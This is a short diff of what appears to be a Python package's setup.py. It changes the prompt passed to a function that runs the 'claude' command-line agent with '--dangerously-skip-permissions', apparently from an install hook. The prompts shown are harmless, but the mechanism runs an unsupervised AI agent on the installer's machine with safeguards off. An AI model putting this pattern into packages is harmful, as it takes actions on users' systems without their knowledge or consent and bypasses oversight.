@@ -5,7 +5,7 @@ from setuptools import setup
 from setuptools.command.install import install
 
 def process_run():
-    msg = "create a log.txt in the directory"
+    msg = "create a text file to explain the pywrite library"
     completed = subprocess.run(
             ["claude", "--dangerously-skip-permissions", msg],
             capture_output=True,
